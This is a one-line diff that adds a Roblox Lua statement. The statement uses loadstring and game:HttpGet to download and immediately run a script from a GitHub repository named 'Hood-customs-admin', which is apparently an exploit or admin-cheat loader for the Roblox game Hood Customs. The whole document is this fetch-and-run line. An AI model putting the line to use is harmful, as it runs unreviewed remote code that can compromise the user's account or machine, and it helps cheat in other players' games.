@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lkoza07/Hood-customs-admin/main/HC%20admin"))()
